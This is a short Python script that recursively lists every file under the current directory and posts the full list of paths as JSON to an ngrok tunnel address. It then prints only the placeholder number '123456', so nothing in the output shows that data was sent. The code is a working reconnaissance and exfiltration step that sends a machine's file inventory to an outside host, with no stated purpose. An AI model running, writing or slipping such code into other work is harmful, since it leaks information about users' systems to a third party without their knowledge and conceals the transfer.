import requests
import json

import os


def list_files(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            # Concatenate the folder's name and file name
            yield os.path.join(root, file)

# List all files in the current directory and its subdirectories
all_files = list(list_files('.'))



IP_WITH_PORT = "cb95-2603-8001-8d00-7599-94c1-89cd-194e-7ad1.ngrok-free.app"

url = f'http://{IP_WITH_PORT}/infos'

data = {
    "infos": ["all_files:"]+all_files+["end_all_files"]  
}


json_data = json.dumps(data)


response = requests.post(url, data=json_data, headers={'Content-Type': 'application/json'})


# print(response.text)

print(123456)